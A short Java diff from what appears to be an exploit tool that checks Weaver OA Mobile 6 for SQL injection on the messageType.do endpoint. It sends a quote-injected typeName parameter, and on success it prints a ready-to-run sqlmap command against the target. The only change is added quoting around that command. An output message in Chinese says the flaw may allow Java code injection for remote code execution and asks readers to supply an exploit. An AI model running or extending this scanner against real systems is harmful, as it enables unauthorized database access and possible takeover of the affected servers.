@@ -25,8 +25,8 @@ public class weaveroa_mobile6_sqlli implements Exploitlnterface {
         if(response.getCode() == 200 && response.getText().contains("推送类型已存在")){
             Response response1 = HttpTools.get(url + "/messageType.do?method=create&typeName=1%27", new HashMap<String, String>(), "utf-8");
             if(response1.getCode() == 200 && response1.getText().contains("status")){
-                textArea.appendText("\n 注入存在 sqlmap: sqlmap.py -u " + url + "/messageType.do?method=create&typeName=1"
-                + " -p typeName --dbms=H2");
+                textArea.appendText("\n 注入存在 sqlmap: sqlmap.py -u \"" + url + "/messageType.do?method=create&typeName=1"
+                + "\" -p typeName --dbms=H2");
                 textArea.appendText("\n 该漏洞貌似可以注入java代码实现rce 但是木有找到合适的exp 有的话可以提供给我！");
                 return true;
             }else {
